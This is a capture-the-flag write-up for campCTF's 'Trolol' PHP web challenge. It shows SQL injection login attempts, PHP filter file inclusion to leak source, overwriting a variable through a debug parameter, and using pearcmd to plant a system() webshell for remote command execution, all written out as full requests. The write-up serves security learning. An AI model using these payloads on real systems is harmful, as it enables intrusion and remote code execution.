@@ -1,0 +1,184 @@
+Trolol:
+
+---------------------------------------------------------------------
+Description:
+we couldn't get the real flag, could you ? ;) 
+Service
+
+P.S: No Bruteforce of any kind is needed to solve the task
+
+Hints:
+admin love to eat pears
+-----------------------------------------------------------------------
+
+
+
+Starting off this challenge, there are three links on the main page.  The first is a link back to itself, the next is a PHPInfo page and the third is a login prompt.  The first potential target is the login page, which takes user input, so there is a potential for an SQL injection or weak credentials.
+
+The first attempts are things like (USER / PASSWORD):
+
+admin' OR 1=1-- / 
+' OR 1==1-- / 
+!@#$%^&*()_)(*&^%$# / !@#$%^&*()_)(*&^%$#
+admin / admin
+test / test
+
+During testing, the server doesn't respond with any clear errors.  If there was an obvious SQL injection, we might see some form of an SQL error.  Looking at the URL schema, it is appears that the index page is loading the pages we visit. 
+
+http://challs.campctf.ccc.ac:10119/?page=login
+
+Prior to this challenge, I wasn't familiar with PHP filters, which was in troduced in PHP5.  This feature allows for either validating or sanitizing data.  For our purposes here, we can use this to manipulate how the data is presented.  Using a PHP filter, we can try and Base64 encode the login page using the following filter, hopefully, encoding the PHP source in the process.  The PHP filter we are going to use looks like:
+
+==========================================================================
+php://filter/read=convert.base64-encode/resource=login
+==========================================================================
+
+as a URL:
+
+==========================================================================
+http://challs.campctf.ccc.ac:10119/?
+page=php://filter/read=convert.base64-encode/resoource=login
+==========================================================================
+
+The server resounds with a Base64 encoded string:
+
+==========================================================================
+PD9waHAKCS...ogICAgfQo/Pgo=
+==========================================================================
+After decoding the resource we can see the following PHP source:
+
+==========================================================================
+$login=@$_POST['login'];
+$password=@$_POST['password'];
+if(@$login=="admin" && sha1(@$password)==$pwhash){
+	include 'secretdir/flag';
+}else{
+==========================================================================
+
+From this, we know the username is 'admin' and the password submitted is SHA1 hashed and compared to a variable named $pwhash.  A successful login will print the file at secretdir/flag.  Browsing to it normally gives us a 403 Forbidden.   
+
+So, if we then run the same query, but this time for the index page, we can see if the variable is defined there:
+
+==========================================================================
+http://challs.campctf.ccc.ac:10119/?page=php://filter/read=convert.base64-encode/resource=index
+==========================================================================
+
+The decoded PHP is shown below:
+==========================================================================
+<?php
+	$pwhash="ffd313452dab00927cb61065a392f30ae454e70f";
+	if(@$_GET['testmode']){
+		$v=@$_GET['v'];
+		${$v}=@$_GET['k'];
+	}
+	include((@$_GET['page']?$_GET['page'].".php":"main.php"));
+?>
+==========================================================================
+ 
+As we can see, the SHA1 hash is ffd313452dab00927cb61065a392f30ae454e70f.  A search online yields no results, likely indicating that it's not a simple hash.  
+
+Examining the code, we can see an IF statement that checks for a testmode.  This feature allows us to modify the value of a variable.  We can use this feature using the following syntax:
+
+==========================================================================
+testmode=1 
+v=<variable we want to overwrite> 
+k=<value of said variable> 
+==========================================================================
+
+In order to login, it we need to change the hash stored in the $pwhash variable to something we know:
+
+==========================================================================
+http://challs.campctf.ccc.ac:10119/?
+page=login&
+testmode=1&
+v=pwhash&
+k=d033e22ae348aeb5660fc2140aec35850c4da997
+==========================================================================
+
+The SHA1 has of 'admin' is d033e22ae348aeb5660fc2140aec35850c4da997.  After making this request allows us to log in with admin/admin.
+
+After a successful login, we are greeted with:
+
+==========================================================================
+<!-- this is a fake flag ! try harder, maby get an RCE ? :P -->
+flag{flag_flag_flag_flag_flag_flagl?}
+==========================================================================
+
+
+So, it looks like we've been trolled by a false flag.  Taking a step back, lets see what we can pull from the system using the PHP filters:
+
+==========================================================================
+http://challs.campctf.ccc.ac:10119/?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
+[FAILED]
+http://challs.campctf.ccc.ac:10119/?page=php://filter/read=convert.base64-encode/resource=/
+[FAILED]
+==========================================================================
+
+
+Going back to the original hint, the creators reference Pears.  After installing a few web applications, I've had to install PHP Pear more then a few times.  We can lookup if PEAR is installed by searching the PHPInfo() page for /PEAR/.  The search turns up:
+
+==========================================================================
+include_path	.:/usr/share/php:/usr/share/pear
+==========================================================================
+
+Searching around, I found a blog post that talked about LFI using pearcmd from PEAR:
+
+http://achn30.blogspot.com/2014/11/poc-quickcart-v65-local-file-inclusion.html
+
+From the post, the interesting request was:
+
+==========================================================================
+GET /qcv56/admin.php? HTTP/1.1
+Host: 127.0.0.1
+Connection: close
+Accept-Language: pl-PL,pl;
+Cookie: sAdminLanguage=../../../../../../../../usr/lib/php/pearcmd;
+==========================================================================
+
+
+In this request, they are essentially executing:
+
+==========================================================================
+/usr/lib/php/pearcmd -s -c ./files/83f2a5ec3fca.php -dpreferred_mirror=<?php phpinfo() ?>
+==========================================================================
+
+
+While this didn't present a clear path to the flag, it opened the door for figuring out how to use pearcmd to arbitrarily write data to the file system.  Using testmode, we can define the arguments passed to pearcmd.
+
+Using this, we can write a simple webshell to /tmp/83f2a5ec3fcd.php:
+
+==========================================================================
+http://challs.campctf.ccc.ac:10119/?
+page=pearcmd&
+testmode=1&
+v=argv&
+k[]=pearcmd&
+k[]=-s&
+k[]=-c&
+k[]=/tmp/83f2a5ec3fcd.php&
+k[]=-dpreferred_mirror="<?php system($_REQUEST['cmd']); ?>"
+==========================================================================
+
+Then we can pass remote commands to it using:
+
+==========================================================================
+http://challs.campctf.ccc.ac:10119/?
+Testmode=1&
+page=php://filter/read=convert.base64-encode%7Cconvert.base64-decode/resource=/tmp/83f2a5ec3fcd&
+cmd=ls /
+==========================================================================
+
+In the root directory, we can see a file named:
+
+flag_7f6b8ec0adfe91dd6505ff934aaa61565c91aebf
+
+Using the following syntax we can print the flag:
+
+==========================================================================
+http://challs.campctf.ccc.ac:10119/?
+Testmode=1&
+page=php://filter/read=convert.base64-encode%7Cconvert.base64-decode/resource=/tmp/83f2a5ec3fcd&
+cmd=cat /flag_7f6b8ec0adfe91dd6505ff934aaa61565c91aebf
+==========================================================================
+
+//FTW
